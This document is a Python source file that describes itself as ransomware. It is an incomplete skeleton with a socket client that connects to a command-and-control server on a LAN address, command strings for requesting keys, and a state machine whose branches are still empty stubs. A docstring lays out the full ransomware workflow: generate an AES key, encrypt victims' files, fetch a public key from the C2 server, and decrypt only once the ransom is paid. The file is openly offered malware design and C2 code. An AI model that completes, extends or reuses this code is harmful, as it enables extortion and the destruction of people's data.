import socket
from enum import Enum

# server stuff
PORT = 5051
SERVER = '192.168.1.160'
HEADER = 64
FORMAT = 'utf-8'
ADDR = (SERVER, PORT)

#commands
COMMAND_PUBLIC_KEY = 'public-key'
COMMAND_PRIVATE_KEY = 'private-key'
COMMAND_DISCONNECT = 'disconnect'

#ransomware specific
class Status(Enum):
    NEUTRAL = 0
    ENCRYPT = 1
    ASK_FOR_PUB_KEY = 2
    ASK_FOR_PRIV_KEY = 3
    DECRYPT = 4
    PING_C2 = 5
    SELF_DESTRUCT = 6  #??

status = Status.NEUTRAL  #initally, the ransomware does nothing

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(ADDR)

def send(msg):
    """
    Used to send messages via socket to the C2 server
    """
    message = msg.encode(FORMAT)
    msg_length = len(message)
    send_length = str(msg_length).encode(FORMAT)
    send_length += b' ' * (HEADER - len(send_length))
    client.send(send_length)
    client.send(message)

def encrypt():
    pass

def createAES():
    pass


"""
This file is the actual ransomware.
1. It creates the AES key
2. It encrypts all files of interest
3. It communicates with the C2 server and gets a public key
4. It encrypts the AES key with the public key, and stores the encrypted key
5. When the ransom is payed, the ransomware communicates with the C2 server, gets the private key,
and decrypts all the files that where encrypted
"""

def control_flow():
    match status:
        case Status.NEUTRAL:
            #find files to encrypt
            return
        case Status.ENCRYPT:
            #
            return
        case Status.ASK_FOR_PUB_KEY:
            #
            return
        case Status.ASK_FOR_PRIV_KEY:
            #
            return
        case Status.DECRYPT:
            #
            return
        case Status.PING_C2:
            #
            return
        case Status.SELF_DESTRUCT:
            #
            return
        case _:
            return


control_flow()
#send(COMMAND_DISCONNECT)